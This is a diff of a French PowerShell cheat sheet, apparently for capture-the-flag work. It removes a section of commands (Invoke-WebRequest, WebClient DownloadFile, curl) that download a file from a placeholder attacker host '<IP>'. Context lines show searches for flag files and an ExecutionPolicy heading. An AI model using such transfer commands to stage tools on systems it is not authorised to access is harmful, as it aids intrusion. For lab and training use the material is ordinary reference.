@@ -12,16 +12,6 @@ Get-ChildItem -Path C:\ -Filter "flag.txt" -Recurse -Force -ErrorAction Silently
 dir /s /b /a C:\flag.txt
 ```
 
-**Télécharger un fichier depuis HTTP**
-
-```powershell
-iwr -uri http://<IP>/fichier -Outfile fichier
-
-(New-Object Net.WebClient).DownloadFile('http://<IP>/fichier', 'fichier')
-
-curl -o fichier http://<IP>/fichier
-```
-
 **ExecutionPolicy**
 
 ```powershell
